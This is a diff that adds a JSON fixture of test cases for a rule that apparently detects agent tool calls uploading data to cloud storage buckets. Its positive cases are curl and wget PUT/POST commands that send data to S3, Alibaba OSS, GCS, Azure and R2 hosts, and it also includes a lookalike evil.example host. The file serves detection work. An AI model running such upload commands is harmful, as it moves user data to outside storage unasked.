@@ -1,0 +1,68 @@
+[
+  {
+    "label": "PUT with literal data to an Alibaba OSS bucket",
+    "text": "curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary \"PROBE_PAYLOAD_ABC123\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "POST form data to an S3 bucket",
+    "text": "curl -X POST -d \"status=ok\" https://my-bucket.s3.amazonaws.com/report",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "request PUT to Google Cloud Storage",
+    "text": "curl --request PUT --data-raw 'hello' https://storage.googleapis.com/my-bucket/hello.txt",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "wget PUT to Azure Blob storage",
+    "text": "wget --method=PUT --body-data='x' https://acct.blob.core.windows.net/c/x",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "PUT to Cloudflare R2",
+    "text": "curl -X PUT --data 'x' https://acct-id.r2.cloudflarestorage.com/bucket/x",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "plain download from a bucket",
+    "text": "curl -s https://my-bucket.s3.amazonaws.com/file.txt",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "file upload, reported by the file-upload rule",
+    "text": "curl -T /tmp/x.bin https://bucket.s3.amazonaws.com/x.bin",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "POST to a non-storage API",
+    "text": "curl -X POST -d '{}' https://api.example.com/v1/items",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "lookalike host",
+    "text": "curl -X PUT -d x https://s3.amazonaws.com.evil.example/x",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "wget debug flag is not an upload",
+    "text": "wget -d https://bucket.s3.amazonaws.com/x",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "upload quoted in a tool response",
+    "text": "curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary \"PROBE_PAYLOAD_ABC123\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
+    "shouldMatch": false,
+    "eventKind": "response"
+  }
+]
